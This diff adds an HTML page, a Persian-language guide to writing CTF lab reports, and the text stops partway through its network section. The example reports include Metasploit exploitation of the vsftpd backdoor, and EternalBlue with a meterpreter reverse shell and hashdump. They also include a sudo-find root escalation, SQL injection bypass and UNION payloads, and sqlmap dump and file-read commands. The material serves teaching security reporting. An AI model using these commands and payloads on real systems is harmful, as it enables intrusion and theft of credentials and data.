@@ -1,0 +1,1373 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>راهنمای جامع گزارش‌نویسی CTF - با مثال‌های واقعی</title>
+    <style>
+        :root {
+            --bg: #f5f6fa;
+            --surface: #ffffff;
+            --border: #e1e4e8;
+            --text: #1a1a2e;
+            --text-secondary: #5a5a7a;
+            --accent: #2563eb;
+            --accent-light: #eff6ff;
+            --linux: #e67e22;
+            --linux-light: #fff8f3;
+            --windows: #3498db;
+            --windows-light: #f0f8ff;
+            --web: #8e44ad;
+            --web-light: #faf5ff;
+            --network: #1abc9c;
+            --network-light: #f0fffb;
+            --forensics: #e74c3c;
+            --forensics-light: #fff5f5;
+            --incident: #e91e63;
+            --incident-light: #fff5f8;
+            --shadow: 0 2px 8px rgba(0,0,0,0.06);
+            --shadow-lg: 0 8px 30px rgba(0,0,0,0.1);
+            --code-bg: #f0f2f5;
+        }
+
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --bg: #0d1117;
+                --surface: #161b22;
+                --border: #30363d;
+                --text: #c9d1d9;
+                --text-secondary: #8b949e;
+                --accent: #58a6ff;
+                --accent-light: #0d1117;
+                --code-bg: #1c2128;
+                --shadow: 0 2px 8px rgba(0,0,0,0.3);
+                --shadow-lg: 0 8px 30px rgba(0,0,0,0.5);
+                --linux-light: #1a1410;
+                --windows-light: #101820;
+                --web-light: #18101e;
+                --network-light: #101e1a;
+                --forensics-light: #1a1010;
+                --incident-light: #1a1016;
+            }
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: 'Segoe UI', 'Vazirmatn', system-ui, sans-serif;
+            background: var(--bg);
+            color: var(--text);
+            line-height: 1.8;
+            min-height: 100vh;
+        }
+
+        .container { max-width: 960px; margin: 0 auto; padding: 16px; }
+
+        /* Header */
+        .header {
+            text-align: center;
+            padding: 30px 16px 24px;
+            border-bottom: 1px solid var(--border);
+            margin-bottom: 24px;
+        }
+        .header .icon { font-size: 3rem; display: block; margin-bottom: 8px; }
+        .header h1 { font-size: 1.8rem; font-weight: 800; }
+        .header p { color: var(--text-secondary); font-size: 0.95rem; }
+
+        /* Category Tabs */
+        .tabs-wrapper {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 8px;
+            margin-bottom: 24px;
+            justify-content: center;
+        }
+        .tab-btn {
+            padding: 10px 16px;
+            border: 2px solid var(--border);
+            border-radius: 30px;
+            background: var(--surface);
+            cursor: pointer;
+            font-size: 0.85rem;
+            font-weight: 600;
+            transition: all 0.25s ease;
+            white-space: nowrap;
+            color: var(--text);
+            font-family: inherit;
+        }
+        .tab-btn:hover { border-color: var(--accent); background: var(--accent-light); }
+        .tab-btn.active { border-color: var(--accent); background: var(--accent-light); box-shadow: 0 0 0 3px rgba(37,99,235,0.1); }
+        .tab-btn.linux.active { border-color: var(--linux); box-shadow: 0 0 0 3px rgba(230,126,34,0.15); }
+        .tab-btn.windows.active { border-color: var(--windows); box-shadow: 0 0 0 3px rgba(52,152,219,0.15); }
+        .tab-btn.web.active { border-color: var(--web); box-shadow: 0 0 0 3px rgba(142,68,173,0.15); }
+        .tab-btn.network.active { border-color: var(--network); box-shadow: 0 0 0 3px rgba(26,188,156,0.15); }
+        .tab-btn.forensics.active { border-color: var(--forensics); box-shadow: 0 0 0 3px rgba(231,76,60,0.15); }
+        .tab-btn.incident.active { border-color: var(--incident); box-shadow: 0 0 0 3px rgba(233,30,99,0.15); }
+
+        /* Main Card */
+        .main-card {
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: 16px;
+            box-shadow: var(--shadow-lg);
+            overflow: hidden;
+        }
+        .card-header {
+            padding: 20px 24px;
+            border-bottom: 1px solid var(--border);
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            flex-wrap: wrap;
+        }
+        .card-header .title { font-size: 1.3rem; font-weight: 700; }
+        .card-header .badge {
+            padding: 6px 14px;
+            border-radius: 20px;
+            font-size: 0.8rem;
+            font-weight: 700;
+            color: #fff;
+        }
+        .badge-linux { background: var(--linux); }
+        .badge-windows { background: var(--windows); }
+        .badge-web { background: var(--web); }
+        .badge-network { background: var(--network); }
+        .badge-forensics { background: var(--forensics); }
+        .badge-incident { background: var(--incident); }
+
+        .card-body { padding: 20px 24px; }
+
+        /* Section Block */
+        .section-block {
+            background: var(--bg);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            margin-bottom: 12px;
+            overflow: hidden;
+        }
+        .section-header {
+            padding: 14px 18px;
+            background: var(--surface);
+            border-bottom: 1px solid var(--border);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            cursor: pointer;
+            user-select: none;
+            transition: background 0.2s;
+        }
+        .section-header:hover { background: var(--accent-light); }
+        .section-num {
+            width: 32px; height: 32px;
+            border-radius: 50%;
+            background: var(--accent);
+            color: #fff;
+            display: flex; align-items: center; justify-content: center;
+            font-weight: 800; font-size: 0.9rem;
+            flex-shrink: 0;
+        }
+        .section-title-text { font-weight: 700; font-size: 1rem; flex: 1; }
+        .section-arrow { transition: transform 0.3s; font-size: 1.2rem; color: var(--text-secondary); }
+        .section-block.open .section-arrow { transform: rotate(180deg); }
+
+        .section-content {
+            padding: 0 18px;
+            max-height: 0;
+            overflow: hidden;
+            transition: max-height 0.4s ease, padding 0.4s ease;
+        }
+        .section-block.open .section-content {
+            max-height: 2000px;
+            padding: 16px 18px;
+        }
+
+        /* Hint & Example */
+        .hint-box {
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            padding: 14px 16px;
+            margin-bottom: 10px;
+        }
+        .hint-label {
+            font-weight: 700;
+            font-size: 0.85rem;
+            color: var(--accent);
+            margin-bottom: 6px;
+            display: flex; align-items: center; gap: 6px;
+        }
+        .hint-text { font-size: 0.9rem; color: var(--text-secondary); line-height: 1.7; }
+        .hint-text ul { list-style: none; padding: 0; margin: 4px 0 0; }
+        .hint-text ul li { padding: 3px 0; padding-right: 16px; position: relative; }
+        .hint-text ul li::before { content: '•'; position: absolute; right: 0; color: var(--accent); font-weight: 700; }
+
+        .example-box {
+            background: var(--code-bg);
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            padding: 16px;
+            margin-top: 8px;
+            font-family: 'Consolas', 'Courier New', 'Vazirmatn', monospace;
+            font-size: 0.85rem;
+            line-height: 1.9;
+            white-space: pre-wrap;
+            word-break: break-word;
+            color: var(--text);
+            position: relative;
+        }
+        .example-box::before {
+            content: '📝 مثال عملی';
+            display: block;
+            font-family: 'Segoe UI', 'Vazirmatn', sans-serif;
+            font-weight: 700;
+            font-size: 0.8rem;
+            color: var(--accent);
+            margin-bottom: 8px;
+            padding-bottom: 8px;
+            border-bottom: 1px dashed var(--border);
+        }
+        .example-box .cmd { color: #e67e22; }
+        .example-box .output { color: #8b949e; }
+        .example-box .flag { color: #1abc9c; font-weight: 700; }
+        .example-box .important { color: #e74c3c; font-weight: 700; }
+
+        /* Flow Arrow */
+        .flow-arrow {
+            text-align: center;
+            padding: 4px 0;
+            font-size: 1.3rem;
+            color: var(--accent);
+            opacity: 0.4;
+            font-weight: 700;
+        }
+
+        /* Tips */
+        .tips-card {
+            background: var(--surface);
+            border: 2px dashed var(--border);
+            border-radius: 14px;
+            padding: 20px;
+            margin-top: 20px;
+        }
+        .tips-title { font-weight: 700; font-size: 1rem; margin-bottom: 10px; }
+        .tips-card ul { list-style: none; padding: 0; }
+        .tips-card ul li {
+            padding: 6px 0;
+            font-size: 0.9rem;
+            color: var(--text-secondary);
+            padding-right: 22px;
+            position: relative;
+        }
+        .tips-card ul li::before {
+            content: '💡';
+            position: absolute;
+            right: 0;
+            font-size: 0.8rem;
+        }
+
+        /* Print */
+        @media print {
+            body { background: #fff; color: #000; font-size: 12px; }
+            .tabs-wrapper { display: none; }
+            .section-content { max-height: none !important; padding: 10px 14px !important; }
+            .section-arrow { display: none; }
+            .card-header { padding: 10px 14px; }
+            .card-body { padding: 10px 14px; }
+            .example-box { font-size: 11px; }
+        }
+
+        ::-webkit-scrollbar { width: 6px; }
+        ::-webkit-scrollbar-track { background: transparent; }
+        ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <span class="icon">📋</span>
+            <h1>راهنمای جامع گزارش‌نویسی CTF</h1>
+            <p>انتخاب دسته‌بندی + ساختار کامل + مثال‌های واقعی برای هر بخش</p>
+        </div>
+
+        <!-- Tabs -->
+        <div class="tabs-wrapper">
+            <button class="tab-btn linux active" onclick="switchCategory('linux', this)">🐧 Linux Security</button>
+            <button class="tab-btn windows" onclick="switchCategory('windows', this)">🪟 Windows Security</button>
+            <button class="tab-btn web" onclick="switchCategory('web', this)">🌐 Web Security</button>
+            <button class="tab-btn network" onclick="switchCategory('network', this)">🔗 Network Security</button>
+            <button class="tab-btn forensics" onclick="switchCategory('forensics', this)">🔍 Digital Forensics</button>
+            <button class="tab-btn incident" onclick="switchCategory('incident', this)">🚨 Incident Response</button>
+        </div>
+
+        <!-- Main Card -->
+        <div class="main-card" id="mainCard">
+            <div class="card-header">
+                <span class="title">📄 ساختار گزارش</span>
+                <span class="badge badge-linux" id="badge">Linux Security</span>
+            </div>
+            <div class="card-body" id="cardBody"></div>
+        </div>
+
+        <!-- Tips -->
+        <div class="tips-card" id="tipsCard">
+            <div class="tips-title">💡 نکات طلایی</div>
+            <ul id="tipsList"></ul>
+        </div>
+    </div>
+
+    <script>
+        const reportData = {
+            linux: {
+                name: 'Linux Security',
+                badgeClass: 'badge-linux',
+                tips: [
+                    'همیشه با nmap -sV -sC شروع کنید و خروجی کامل را ذخیره کنید',
+                    'نسخه سرویس‌ها را دقیق ثبت کنید (vsftpd 2.3.4 نه فقط FTP)',
+                    'اگر از Metasploit استفاده کردید، نام کامل ماژول را بنویسید',
+                    'سطح دسترسی را با whoami و id تأیید و در گزارش ثبت کنید',
+                    'مسیر دقیق flag را بنویسید (مثلاً /root/flag.txt)',
+                    'اگر افزایش دسترسی انجام نشد، صریحاً بنویسید "Privilege Escalation: Not Performed"'
+                ],
+                sections: [
+                    {
+                        title: 'Target & Initial Information',
+                        hint: 'اطلاعات اولیه هدف را اینجا بنویسید:',
+                        bullets: ['آدرس IP هدف', 'سیستم‌عامل شناسایی‌شده', 'ابزارهای استفاده‌شده'],
+                        example: `<span class="cmd">Target IP:</span> 10.10.10.5
+<span class="cmd">OS Detected:</span> Ubuntu 20.04 LTS (Linux 5.4.0)
+<span class="cmd">Tool Used:</span> Nmap 7.94
+<span class="cmd">Scan Command:</span> nmap -sV -sC -O 10.10.10.5
+<span class="output">Host is up (0.032s latency)
+OS details: Linux 5.4 - 5.5</span>`
+                    },
+                    {
+                        title: 'Reconnaissance & Enumeration',
+                        hint: 'نتایج شناسایی و شمارش پورت‌ها و سرویس‌ها:',
+                        bullets: ['پورت‌های باز', 'نسخه سرویس‌ها', 'خروجی Nmap', 'اطلاعات اضافی'],
+                        example: `<span class="cmd">Open Ports & Services:</span>
+• Port 21/tcp - FTP - <span class="important">vsftpd 2.3.4</span>
+• Port 22/tcp - SSH - OpenSSH 7.9p1
+• Port 80/tcp - HTTP - Apache 2.4.41
+
+<span class="cmd">Nmap Output:</span>
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     <span class="important">vsftpd 2.3.4</span>
+22/tcp open  ssh     OpenSSH 7.9p1 (Ubuntu)
+80/tcp open  http    Apache httpd 2.4.41
+
+<span class="output">→ vsftpd 2.3.4 identified as potentially vulnerable!</span>`
+                    },
+                    {
+                        title: 'Vulnerability & Exploitation',
+                        hint: 'آسیب‌پذیری و نحوه بهره‌برداری:',
+                        bullets: ['آسیب‌پذیری (CVE)', 'ابزار استفاده‌شده', 'دستورات دقیق', 'نتیجه'],
+                        example: `<span class="cmd">Vulnerability:</span> <span class="important">vsftpd 2.3.4 Backdoor (CVE-2011-2523)</span>
+<span class="cmd">Description:</span> This version contains a backdoor that opens a shell on port 6200 when a username ending with ":)" is sent.
+
+<span class="cmd">Exploitation Tool:</span> Metasploit Framework
+<span class="cmd">Module:</span> exploit/unix/ftp/vsftpd_234_backdoor
+
+<span class="cmd">Commands Executed:</span>
+msf6 > <span class="cmd">use exploit/unix/ftp/vsftpd_234_backdoor</span>
+msf6 > <span class="cmd">set RHOSTS 10.10.10.5</span>
+msf6 > <span class="cmd">set RPORT 21</span>
+msf6 > <span class="cmd">run</span>
+
+<span class="output">[*] 10.10.10.5:21 - Backdoor service has been spawned!
+[*] Command shell session 1 opened (10.10.14.2:4444 → 10.10.10.5:6200)
+<span class="important">→ Exploitation SUCCESSFUL ✓</span></span>`
+                    },
+                    {
+                        title: 'Access & Privilege Escalation',
+                        hint: 'سطح دسترسی اولیه و افزایش دسترسی:',
+                        bullets: ['سطح دسترسی اولیه', 'روش افزایش دسترسی', 'سطح دسترسی نهایی', 'اگر نشد ذکر کنید'],
+                        example: `<span class="cmd">Initial Access Level:</span>
+$ whoami
+<span class="output">root</span>
+$ id
+<span class="output">uid=0(root) gid=0(root) groups=0(root)</span>
+
+<span class="important">→ Initial access was ROOT directly from the exploit!</span>
+<span class="cmd">Privilege Escalation:</span> <span class="output">Not Required - Already Root</span>
+
+<span class="cmd">Note:</span> If not root initially, write the privesc method here.
+Example: "Used sudo -l to find /usr/bin/find with NOPASSWD,
+then executed: sudo find . -exec /bin/sh \\; -quit → Got root shell" `
+                    },
+                    {
+                        title: 'Flag Acquisition',
+                        hint: 'جزئیات پیدا کردن پرچم:',
+                        bullets: ['مسیر flag', 'مقدار flag', 'دستور استفاده‌شده', 'سطح دسترسی لازم'],
+                        example: `<span class="cmd">Flag Location:</span> /root/root.txt
+<span class="cmd">Access Level Required:</span> Root
+
+<span class="cmd">Commands:</span>
+# cd /root
+# ls -la
+<span class="output">-rw-r--r-- 1 root root  33 flag.txt</span>
+# cat flag.txt
+
+<span class="flag">CTF{vsftpd_234_backdoor_pwned_2024}</span>
+
+<span class="important">→ Flag Acquired Successfully ✓</span>`
+                    },
+                    {
+                        title: 'Evidence & Commands',
+                        hint: 'تمام شواهد و دستورات را فهرست کنید:',
+                        bullets: ['اسکرین‌شات‌ها', 'لیست کامل دستورات', 'خروجی‌های ترمینال', 'فایل‌های ضمیمه'],
+                        example: `<span class="cmd">Complete Command History:</span>
+1. nmap -sV -sC -O 10.10.10.5
+2. searchsploit vsftpd 2.3.4
+3. msfconsole -q
+4. use exploit/unix/ftp/vsftpd_234_backdoor
+5. set RHOSTS 10.10.10.5
+6. run
+7. whoami && id
+8. cd /root && ls -la
+9. cat flag.txt
+
+<span class="cmd">Screenshots:</span> [Attached: nmap_scan.png, msf_session.png, flag.png]
+<span class="cmd">Output Files:</span> nmap_scan.txt, terminal_log.txt`
+                    },
+                    {
+                        title: 'Conclusion',
+                        hint: 'جمع‌بندی نهایی:',
+                        bullets: ['خلاصه مراحل', 'آسیب‌پذیری کلیدی', 'پیشنهادات امنیتی', 'مدت زمان'],
+                        example: `<span class="cmd">Summary:</span>
+Target was running vsftpd 2.3.4 which has a known backdoor vulnerability (CVE-2011-2523).
+Exploitation was performed using Metasploit, resulting in direct root access.
+
+<span class="cmd">Key Vulnerability:</span> vsftpd 2.3.4 Backdoor
+
+<span class="cmd">Security Recommendations:</span>
+• Upgrade vsftpd to version 3.0.0 or later immediately
+• Implement regular vulnerability scanning
+• Use firewall to restrict FTP access to trusted IPs only
+
+<span class="cmd">Time Taken:</span> ~25 minutes
+<span class="cmd">Difficulty:</span> Easy`
+                    }
+                ]
+            },
+            windows: {
+                name: 'Windows Security',
+                badgeClass: 'badge-windows',
+                tips: [
+                    'نسخه ویندوز و build number را با دستور systeminfo استخراج کنید',
+                    'سرویس‌های SMB (445) و RDP (3389) را با اولویت بالا بررسی کنید',
+                    'از winPEAS یا PowerUp برای شناسایی مسیرهای افزایش دسترسی استفاده کنید',
+                    'اگر از mimikatz استفاده کردید، حتماً ذکر کنید',
+                    'مسیر flag معمولاً در C:\\Users\\Administrator\\Desktop\\root.txt است',
+                    'UAC bypass و Token Impersonation از رایج‌ترین روش‌های privesc ویندوز هستند'
+                ],
+                sections: [
+                    {
+                        title: 'Target & Initial Information',
+                        hint: 'اطلاعات اولیه هدف ویندوزی:',
+                        bullets: ['IP و نام ماشین', 'نسخه ویندوز', 'دامنه', 'ابزارهای اولیه'],
+                        example: `<span class="cmd">Target IP:</span> 10.10.10.10
+<span class="cmd">Hostname:</span> WIN-SERVER01
+<span class="cmd">OS:</span> <span class="important">Windows Server 2019 Standard (Build 17763)</span>
+<span class="cmd">Domain:</span> WORKGROUP
+<span class="cmd">Scan Tool:</span> Nmap 7.94
+<span class="cmd">Command:</span> nmap -sV -sC -O 10.10.10.10`
+                    },
+                    {
+                        title: 'Reconnaissance & Enumeration',
+                        hint: 'نتایج شناسایی پورت‌ها و سرویس‌های ویندوز:',
+                        bullets: ['پورت‌های باز', 'سرویس‌های ویندوزی', 'SMB shares', 'کاربران'],
+                        example: `<span class="cmd">Open Ports:</span>
+• <span class="important">445/tcp - SMB (EternalBlue candidate?)</span>
+• 3389/tcp - RDP
+• 5985/tcp - WinRM
+
+<span class="cmd">SMB Enumeration:</span>
+$ smbclient -L //10.10.10.10
+<span class="output">Sharename       Type      Comment
+---------       ----      -------
+ADMIN$          Disk      Remote Admin
+C$              Disk      Default share
+<span class="important">Share           Disk      (readable!)</span></span>
+
+<span class="cmd">Nmap SMB Scripts:</span>
+$ nmap --script smb-vuln* -p 445 10.10.10.10
+<span class="output">Host script results:
+| smb-vuln-ms17-010: 
+|   VULNERABLE:
+|   Remote Code Execution in SMBv1 <span class="important">(MS17-010 / EternalBlue)</span></span>`
+                    },
+                    {
+                        title: 'Vulnerability & Initial Access',
+                        hint: 'آسیب‌پذیری و دسترسی اولیه:',
+                        bullets: ['آسیب‌پذیری', 'اکسپلویت', 'نوع shell', 'دسترسی اولیه'],
+                        example: `<span class="cmd">Vulnerability:</span> <span class="important">MS17-010 (EternalBlue) - SMBv1 RCE</span>
+
+<span class="cmd">Exploitation:</span>
+msf6 > <span class="cmd">use exploit/windows/smb/ms17_010_eternalblue</span>
+msf6 > <span class="cmd">set RHOSTS 10.10.10.10</span>
+msf6 > <span class="cmd">set PAYLOAD windows/x64/meterpreter/reverse_tcp</span>
+msf6 > <span class="cmd">set LHOST 10.10.14.5</span>
+msf6 > <span class="cmd">run</span>
+
+<span class="output">[*] Shellcode sent successfully!
+[*] Meterpreter session 1 opened
+<span class="important">→ Initial Access: NT AUTHORITY\\SYSTEM ✓</span></span>
+
+<span class="cmd">meterpreter ></span> getuid
+<span class="output">Server username: NT AUTHORITY\\SYSTEM</span>`
+                    },
+                    {
+                        title: 'Post-Exploitation & Privilege Escalation',
+                        hint: 'فعالیت‌های پس از نفوذ و افزایش دسترسی:',
+                        bullets: ['سطح دسترسی', 'ابزارهای privesc', 'روش افزایش دسترسی', 'دسترسی نهایی'],
+                        example: `<span class="cmd">Current Access:</span> NT AUTHORITY\\SYSTEM (Already highest privilege)
+
+<span class="important">→ Privilege Escalation NOT Required - Already SYSTEM from exploit</span>
+
+<span class="cmd">Post-Exploitation Commands:</span>
+meterpreter > <span class="cmd">sysinfo</span>
+<span class="output">Computer: WIN-SERVER01
+OS: Windows Server 2019 (Build 17763)</span>
+
+meterpreter > <span class="cmd">hashdump</span>
+<span class="output">Administrator:500:aad3b435b51404ee...
+Guest:501:aad3b435b51404ee...</span>
+
+<span class="cmd">Note:</span> If you got user shell, write privesc here.
+Example: "Used PowerUp.ps1 → Found SeImpersonatePrivilege → 
+Used JuicyPotato.exe → Got SYSTEM shell" `
+                    },
+                    {
+                        title: 'Flag Acquisition',
+                        hint: 'پیدا کردن flag در ویندوز:',
+                        bullets: ['مسیر flag', 'مقدار flag', 'دستور', 'محدودیت دسترسی'],
+                        example: `<span class="cmd">Searching for flags:</span>
+meterpreter > <span class="cmd">search -f root.txt</span>
+<span class="output">Found 1 result...
+    c:\\Users\\Administrator\\Desktop\\root.txt (33 bytes)</span>
+
+meterpreter > <span class="cmd">cat "c:\\Users\\Administrator\\Desktop\\root.txt"</span>
+
+<span class="flag">CTF{eternal_blue_pwned_windows_2024}</span>
+
+<span class="important">→ Flag Acquired Successfully ✓</span>
+
+<span class="cmd">User flag also found:</span>
+c:\\Users\\User\\Desktop\\user.txt → <span class="flag">CTF{user_flag_2024}</span>`
+                    },
+                    {
+                        title: 'Evidence & Commands',
+                        hint: 'مستندات و شواهد:',
+                        bullets: ['اسکرین‌شات', 'لیست دستورات', 'خروجی‌ها', 'فایل‌های ضمیمه'],
+                        example: `<span class="cmd">Complete Commands:</span>
+1. nmap -sV -sC -O 10.10.10.10
+2. nmap --script smb-vuln* -p 445 10.10.10.10
+3. msfconsole -q
+4. use exploit/windows/smb/ms17_010_eternalblue
+5. set RHOSTS 10.10.10.10
+6. set PAYLOAD windows/x64/meterpreter/reverse_tcp
+7. set LHOST 10.10.14.5
+8. run
+9. getuid
+10. sysinfo
+11. hashdump
+12. search -f root.txt
+13. cat root.txt
+
+<span class="cmd">Screenshots:</span> [nmap_scan.png, msf_exploit.png, flag.png]
+<span class="cmd">Files:</span> hashes.txt, terminal_log.txt`
+                    },
+                    {
+                        title: 'Conclusion',
+                        hint: 'جمع‌بندی نهایی:',
+                        bullets: ['خلاصه', 'آسیب‌پذیری', 'پیشنهادات', 'زمان'],
+                        example: `<span class="cmd">Summary:</span>
+Windows Server 2019 vulnerable to MS17-010 (EternalBlue).
+Exploited via Metasploit, gained SYSTEM access immediately.
+Both user.txt and root.txt flags captured.
+
+<span class="cmd">Key Vulnerability:</span> MS17-010 - EternalBlue (SMBv1 RCE)
+
+<span class="cmd">Recommendations:</span>
+• Apply MS17-010 patch (KB4012212) immediately
+• Disable SMBv1 protocol
+• Enable Windows Firewall and restrict SMB access
+• Regular security updates
+
+<span class="cmd">Time Taken:</span> ~30 minutes
+<span class="cmd">Difficulty:</span> Medium (Easy with Metasploit)`
+                    }
+                ]
+            },
+            web: {
+                name: 'Web Security',
+                badgeClass: 'badge-web',
+                tips: [
+                    'آدرس کامل URL و endpointها را دقیق ثبت کنید',
+                    'Payload استفاده‌شده را کامل بنویسید (حتی اگر کار نکرد)',
+                    'از Burp Suite استفاده کنید و request/response را save کنید',
+                    'نوع آسیب‌پذیری را دقیق مشخص کنید (SQLi, XSS, IDOR, SSTI و...)',
+                    'تأثیر حمله را شرح دهید (Data Leak, RCE, Auth Bypass, File Read)',
+                    'اگر flag در database بود، query استفاده‌شده را بنویسید'
+                ],
+                sections: [
+                    {
+                        title: 'Target & Application',
+                        hint: 'شناسایی اپلیکیشن وب هدف:',
+                        bullets: ['آدرس کامل', 'تکنولوژی‌ها', 'CMS/Framework', 'نوع احراز هویت'],
+                        example: `<span class="cmd">Target URL:</span> <span class="important">http://10.10.10.15:8080</span>
+<span class="cmd">Application Type:</span> Custom Web App (Login + Dashboard)
+<span class="cmd">Technology Stack:</span>
+• Backend: <span class="important">PHP 7.4.3</span>
+• Web Server: Apache/2.4.41 (Ubuntu)
+• Database: MySQL 8.0
+<span class="cmd">Authentication:</span> Username/Password login form at /login.php
+<span class="cmd">Discovered Endpoints:</span> /login.php, /dashboard.php, /admin/, /api/user.php`
+                    },
+                    {
+                        title: 'Reconnaissance & Enumeration',
+                        hint: 'شناسایی endpointها و پارامترها:',
+                        bullets: ['Endpointها', 'پارامترها', 'فایل‌های حساس', 'نتایج اسکن'],
+                        example: `<span class="cmd">Directory Bruteforce:</span>
+$ gobuster dir -u http://10.10.10.15:8080 -w common.txt
+<span class="output">
+/login.php          (Status: 200)
+/dashboard.php      (Status: 302 → redirect to login)
+/admin/             (Status: 403 Forbidden)
+/api/               (Status: 200)
+/robots.txt         (Status: 200 → Disallow: /backup/)
+<span class="important">/backup/            (Status: 200 → Contains backup.zip!)</span>
+</span>
+
+<span class="cmd">Parameter Discovery:</span>
+• login.php: <span class="important">username=</span>, <span class="important">password=</span>
+• api/user.php: <span class="important">id=</span> (potentially vulnerable)
+• dashboard.php: <span class="important">user=</span>`
+                    },
+                    {
+                        title: 'Vulnerability Identification',
+                        hint: 'شناسایی نوع آسیب‌پذیری:',
+                        bullets: ['نوع آسیب‌پذیری', 'پارامتر آسیب‌پذیر', 'روش شناسایی', 'Payload تست'],
+                        example: `<span class="cmd">Vulnerability Type:</span> <span class="important">SQL Injection (Error-Based)</span>
+<span class="cmd">Vulnerable Parameter:</span> username (POST /login.php)
+<span class="cmd">Vulnerable Endpoint:</span> http://10.10.10.15:8080/login.php
+
+<span class="cmd">Test Payloads:</span>
+<span class="cmd">1. Basic test:</span> username=<span class="important">admin'</span>&password=test
+<span class="output">→ MySQL Error: You have an error in your SQL syntax...</span>
+<span class="important">→ SQL Injection CONFIRMED ✓</span>
+
+<span class="cmd">2. Login bypass:</span> username=<span class="important">admin' OR '1'='1'-- -</span>&password=test
+<span class="output">→ Login successful! Redirected to /dashboard.php</span>
+<span class="important">→ Authentication Bypass SUCCESSFUL ✓</span>`
+                    },
+                    {
+                        title: 'Exploitation & Impact',
+                        hint: 'بهره‌برداری کامل و تأثیر:',
+                        bullets: ['Payload نهایی', 'نتیجه', 'تأثیر', 'محدودیت‌ها'],
+                        example: `<span class="cmd">Full Exploitation with sqlmap:</span>
+$ sqlmap -u "http://10.10.10.15:8080/login.php" \\
+  --data="username=admin&password=test" \\
+  <span class="important">--dump</span> --batch
+
+<span class="output">Database: webapp_db
+Table: users
++----+----------+------------------+-------------------+
+| id | username | password         | role              |
++----+----------+------------------+-------------------+
+| 1  | admin    | 5f4dcc3b5aa765.. | <span class="important">admin</span>             |
+| 2  | user1    | e10adc3949ba59.. | user              |
++----+----------+------------------+-------------------+
+
+Table: <span class="important">flags</span>
++----+------------------------------------+
+| id | flag_value                         |
++----+------------------------------------+
+| 1  | <span class="flag">CTF{sql_injection_master_2024}</span> |
++----+------------------------------------+</span>
+
+<span class="cmd">Impact:</span>
+• Authentication bypass → Admin access gained
+• Database dump → All user data exposed
+• Flag extracted from database`
+                    },
+                    {
+                        title: 'Flag Acquisition',
+                        hint: 'استخراج flag:',
+                        bullets: ['محل flag', 'مقدار flag', 'query/دستور', 'نوع flag'],
+                        example: `<span class="cmd">Flag Location:</span> Database table 'flags' in 'webapp_db'
+<span class="cmd">Method:</span> sqlmap --dump (automatic extraction)
+
+<span class="cmd">Manual SQL Query Used:</span>
+' UNION SELECT 1, flag_value, 3, 4 FROM flags-- -
+
+<span class="flag">CTF{sql_injection_master_2024}</span>
+
+<span class="important">→ Flag Acquired via SQL Injection ✓</span>
+
+<span class="cmd">Alternative (if file-based flag):</span>
+$ sqlmap --file-read=/var/www/flag.txt
+<span class="output">[INFO] /var/www/flag.txt saved to local file</span>`
+                    },
+                    {
+                        title: 'Evidence & Requests',
+                        hint: 'مستندات HTTP:',
+                        bullets: ['Request/Response', 'اسکرین‌شات', 'Payloadها', 'خروجی sqlmap'],
+                        example: `<span class="cmd">Burp Suite Request (Login Bypass):</span>
+POST /login.php HTTP/1.1
+Host: 10.10.10.15:8080
+Content-Type: application/x-www-form-urlencoded
+
+username=<span class="important">admin' OR '1'='1'-- -</span>&password=test
+
+<span class="cmd">Response:</span>
+HTTP/1.1 302 Found
+Location: /dashboard.php
+Set-Cookie: session=<span class="important">eyJhZG1pbiI6dHJ1ZX0=</span>
+
+<span class="cmd">sqlmap Output:</span> [Saved: sqlmap_output.txt]
+<span class="cmd">Screenshots:</span> [login_bypass.png, sqlmap_dump.png, flag.png]`
+                    },
+                    {
+                        title: 'Conclusion',
+                        hint: 'جمع‌بندی:',
+                        bullets: ['خلاصه', 'شدت', 'پیشنهادات', 'زمان'],
+                        example: `<span class="cmd">Summary:</span>
+Web application vulnerable to SQL Injection in login form.
+Authentication bypass achieved → Database dumped → Flag extracted.
+
+<span class="cmd">Severity:</span> <span class="important">Critical (CVSS 9.8)</span>
+• Authentication Bypass
+• Full Database Exposure
+• Sensitive Data Leak
+
+<span class="cmd">Recommendations:</span>
+• Use Parameterized Queries (Prepared Statements)
+• Input validation and sanitization
+• Implement WAF (Web Application Firewall)
+• Regular penetration testing
+
+<span class="cmd">Time Taken:</span> ~20 minutes
+<span class="cmd">Difficulty:</span> Medium`
+                    }
+                ]
+            },
+            network: {
+                name: 'Network Security',
+                badgeClass: 'badge-network',
+                tips: [
+                    'توپولوژی شبکه را حتی ساده رسم کنید (هاست A → هاست B)',
+                    'پروتکل‌های تحلیل‌شده را نام ببرید (HTTP, FTP, SMB, DNS)',
+                    'فیلترهای Wireshark استفاده‌شده را بنویسید (مثلاً http.request.method == GET)',
+                    'Credentialهای captured شده را با فرمت اصلی ثبت کنید',
+                    'اگر MITM انجام دادید، روش دقیق را شرح دهید',
+                    'فایل PCAP اصلی را ضمیمه گزارش کنید'
+                ],
+                sections: [
+                    {
+                        title: 'Target & Network Information',
+                        hint: 'اطلاعات شبکه هدف:',
+                        bullets: ['محدوده IP', 'توپولوژی', 'هاست‌ها', 'ابزارها'],
+                        example: `<span class="cmd">Network Range:</span> 10.10.10.0/24
+<span class="cmd">Target Hosts Identified:</span>
+• 10.10.10.1 - Gateway/Router
+• <span class="important">10.10.10.20 - FTP Server (Target)</span>
+• 10.10.10.30 - Web Server
+• 10.10.10.40 - Client (victim)
+
+<span class="cmd">Tools Used:</span>
+• Nmap 7.94 (Network Discovery)
+• <span class="important">Wireshark 4.2 (Traffic Analysis)</span>
+• ettercap 0.8.3 (MITM Attack)
+
+<span class="cmd">Network Topology:</span>
+[Victim: 10.10.10.40] ⇄ [Gateway] ⇄ [FTP Server: 10.10.10.20]
+                         ↑
